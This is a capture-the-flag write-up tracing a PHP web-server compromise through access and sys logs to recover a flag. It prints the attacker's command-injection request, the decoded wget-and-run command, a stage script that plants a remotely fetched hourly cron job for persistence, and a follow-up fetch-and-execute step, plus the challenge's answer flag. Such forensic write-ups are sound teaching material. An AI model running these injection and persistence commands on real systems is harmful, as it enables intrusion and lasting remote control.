# H4x0r3d (264 pt)

Task by Mikhail Driagunov (@aethereternity) · Par time: ~40 min
○○○○○○○○○●●○●○○○○○●○●○○○○○○●○○○○○○○○○●○○●○○○●○○○○○●○○○○○○○●○○○○○○

I've tried to learn some PHP, but some evil guy hacked me!

Can you catch him by looking at my logs?

Download: [h4x0r3d_logs.7z](h4x0r3d_logs_c0abe4acb8.7z)

# Solution

Inspecting `access.log`, we find a suspicious request:

> 192.168.138.1 - - [29/Oct/2020:00:08:06 +0300] "GET /test-verysecretfile.php?expression=shell_exec%28%22%60echo+c2ggLWMgIiQod2dldCAtTy1odHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FldGhlckV0ZXJuaXR5LzQ4NGZlYzZmYjBmMjdlZjZlYzgxYjU4YWVlNTZlZGQxL3Jhdy8wN2MyZjc5NjBlYTE1MmVmOTRjMjBmZDJjMDlkZjU0YmMyMWQ4NmU5L3N0YWdlLnNoKSI%3D+%7C+base64+-d%60%22%29 HTTP/1.1" 200 435 "-" "python-requests/2.23.0"

The base64 string decodes to:

```
sh -c "$(wget -O-https://gist.githubusercontent.com/AetherEternity/484fec6fb0f27ef6ec81b58aee56edd1/raw/07c2f7960ea152ef94c20fd2c09df54bc21d86e9/stage.sh)"
```

Now let's see what this piece of code does:

```
#!/bin/sh
NEW_UUID=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)

echo $NEW_UUID > /etc/persist

BASE="http://188.143.222.218:4455/persist?uuid="
wget -O /etc/cron.hourly/persist "$BASE$NEW_UUID"
chmod +x /etc/cron.hourly/persist
```

Where can we find this UUID? Let's have a look at `syslog`:

> Oct 29 0:26:54 debian-min root: Started door with uid AV0pUn47GjLGyaOXdMAbfeuef6WDFGfy

Now we visit [http://188.143.222.218:4455/persist/?uuid=AV0pUn47GjLGyaOXdMAbfeuef6WDFGfy](http://188.143.222.218:4455/persist/?uuid=AV0pUn47GjLGyaOXdMAbfeuef6WDFGfy)

```
#!/bin/sh
UUID = `cat /etc/persist`
BASE="http://188.143.222.218:4455/?uuid="
logger -s "Started door with uid $UUID"
sh -c "$(wget -O- $BASE$NEW_UUID)"
```

Follow the trace to [http://188.143.222.218:4455/?uuid=AV0pUn47GjLGyaOXdMAbfeuef6WDFGfy](http://188.143.222.218:4455/?uuid=AV0pUn47GjLGyaOXdMAbfeuef6WDFGfy):

```
sh -c "`echo ZWNobyBPTllHRVkzVU1aNVdXTVpUT0JQWFNNRFZPSlBXTTVEUUw1WlRJWlJUUFVGQT09PT0gfCBiYXNlMzIgLWQgPiAvZXRjL3NlY3JldC5mbGFnCg== | base64 -d`"
```

Decode the base64 string:

```
echo ONYGEY3UMZ5WWMZTOBPXSMDVOJPWM5DQL5ZTIZRTPUFA==== | base32 -d > /etc/secret.flag
```

Decode again and we get the flag: `spbctf{k33p_y0ur_ftp_s4f3}`
